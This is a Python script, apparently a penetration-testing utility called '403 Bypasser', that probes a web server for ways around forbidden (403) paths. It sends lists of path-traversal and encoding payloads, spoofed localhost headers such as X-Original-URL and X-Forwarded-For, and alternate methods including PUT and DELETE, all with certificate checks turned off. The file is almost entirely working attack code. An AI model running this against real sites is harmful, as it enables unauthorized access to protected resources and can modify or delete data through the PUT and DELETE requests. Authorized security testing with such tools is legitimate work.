#!/usr/bin/python3
import requests
from warnings import filterwarnings
from argparse import ArgumentParser
from signal import signal, SIGINT



class Color:
    DARKGREY = '\033[90m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    ORANGE = '\033[33m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    END = '\033[0m'
    BOLD = '\033[1m'







# Handle the KeyboardInterrupt Error
def signal_handler(signal, frame):
    exit(Color.BOLD + Color.RED + "\nGoodBye!" + Color.END)
signal(SIGINT, signal_handler)




filterwarnings('ignore', message='Unverified HTTPS request')

parser = ArgumentParser(description=Color.BOLD+Color.YELLOW+"403 Bypasser"+Color.END+": python 403-bypasser.py -u https://www.example.com -p admin")
parser.add_argument('-u', '--url', help=Color.CYAN+"Provide URL"+Color.END, type=str, required=True)
parser.add_argument('-p', '--path', help=Color.CYAN+"Provide the path"+Color.END, type=str, required=True)
parser.add_argument('-i', '--ignore-first-rq', action='store_false',help=Color.RED + Color.BOLD + "Ignore"+ Color.END + Color.YELLOW + " the first request of "+Color.BLUE+"URL"+Color.END+" + "+Color.BLUE+"Path"+Color.END+Color.YELLOW+" for see it's "+Color.RED+Color.BOLD+"403"+Color.END+Color.YELLOW+" or not" + Color.END)
parser.add_argument('-s', '--silent', action='store_false', help=Color.DARKGREY + "Shhhhhhh...!"+Color.END+", Don't show the banner")
parser.add_argument('-wc', '--without-color', action='store_true', help=Color.GREEN + 'W' + Color.ORANGE + 'i'+ Color.MAGENTA + 't' + Color.CYAN + 'h'+ Color.BLUE + Color.YELLOW + 'o' + Color.RED + 'u' + Color.ORANGE + 't' + Color.MAGENTA + ' C' + Color.CYAN + 'o' + Color.BLUE + Color.GREEN + 'l' + Color.CYAN + 'o' + Color.BLUE + 'r' + Color.END) # who don't love the colors? :\
parser.add_argument('-r', '--redirect', action='store_true', help=Color.BLUE+"Allow redirect "+Color.DARKGREY+"(default is False)"+Color.END)
parser.add_argument('-t', '--timeout', type=int, default=5, help=Color.CYAN+"Number of timeout "+Color.DARKGREY+"(sec)"+Color.END)
args = parser.parse_args()

if args.silent:
    print(Color.CYAN + """ _  _    ___ _____   ____
| || |  / _ \___ /  | __ ) _   _ _ __   __ _ ___ ___  ___ _ __
| || |_| | | ||_ \  |  _ \| | | | '_ \ / _` / __/ __|/ _ \ '__|
|__   _| |_| |__) | | |_) | |_| | |_) | (_| \__ \__ \  __/ |
   |_|  \___/____/  |____/ \__, | .__/ \__,_|___/___/\___|_|
                           |___/|_|
                                                V1.0
""" + Color.END)


if args.without_color:
    Color.DARKGREY = ''
    Color.RED = ''
    Color.GREEN = ''
    Color.YELLOW = ''
    Color.BLUE = ''
    Color.MAGENTA = ''
    Color.CYAN = ''
    Color.ORANGE = ''
    Color.END = ''
    Color.BOLD = ''





payloads = ["/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]
url = args.url
path = args.path




# if url hasn't "https://" or "http://" then add it 
if url[0:8] == 'https://' or url[0:7] == 'http://':
    pass
else:
    url = 'https://' + url


# if '/' is not the first char then add it 
if path[0] != '/':
    path = '/' + path



# simple request for see the status code is 403 or not (Ignore it with -i or --ignore-first-rq)
if args.ignore_first_rq:
    rq = requests.get(url + path)
    if rq.status_code != 403:
        exit("The path of this URL is not " + Color.BOLD + Color.ORANGE + "403" + Color.END)



# https://example.com + /path
url_with_path = url + path

def plus1(payload):
    return url_with_path + payload + '\t'


def status(request, payload=''):
    status_code = str(request.status_code)
    if status_code == '200':
        return(url_with_path + payload + '\t\t[' + Color.BOLD + Color.GREEN + status_code + Color.END + ']')
    elif status_code == '404':
        return(url_with_path + payload + '\t\t[' + Color.BOLD + Color.RED + status_code + Color.END + ']')
    elif status_code == '301' or status_code == '302':
        return(url_with_path + payload + '\t\t[' + Color.BOLD + Color.BLUE + status_code + Color.END + ']')
    elif status_code == '403':
        return(url_with_path + payload +'\t\t[' + Color.BOLD + Color.ORANGE + status_code + Color.END + ']')
    

try:
    
    for payload in payloads:
    
        rq = requests.get(plus1(payload), allow_redirects=args.redirect, verify=False, timeout=args.timeout)
        print(status(rq, payload=payload))

except requests.exceptions.ConnectionError:
    pass



def plus2(payload):
    return url + payload + path

try:
    
    for payload in payloads:
        rq = requests.get(plus2(payload), allow_redirects=args.redirect, verify=False, timeout=5)
        print(status(rq, payload=payload))

except requests.exceptions.ConnectionError:
    pass


header = [
    {"X-Original-URL":path},
    {"X-Custom-IP-Authorization" : "127.0.0.1"},
    {"X-Forwarded-For": "http://127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1:80"},
    {"X-rewrite-url": path},
    {'X-Forwarded-Host':'127.0.0.1'},
    {'X-Host':'127.0.0.1'},
    {'X-Remote-IP':'127.0.0.1'},
    {'X-Originating-IP':'127.0.0.1'}
    ]


for payload in header:
    rq = requests.get(url_with_path, headers=payload , allow_redirects=False , verify=False , timeout=5)
    print(status(rq, payload='\t'+str(payload)))





rq = requests.post(url_with_path, allow_redirects=False, verify=False, timeout=5)
print(status(rq, payload=' Using POST'))

rq = requests.head(url_with_path, allow_redirects=False, verify=False, timeout=5)
print(status(rq, payload=' Using HEAD'))

rq = requests.put(url_with_path, allow_redirects=False, verify=False, timeout=5)
print(status(rq, payload=' Using PUT'))

rq = requests.delete(url_with_path, allow_redirects=False, verify=False, timeout=5)
print(status(rq, payload=' Using DELETE'))

rq = requests.patch(url_with_path, allow_redirects=False, verify=False, timeout=5)
print(status(rq, payload=' Using PATCH'))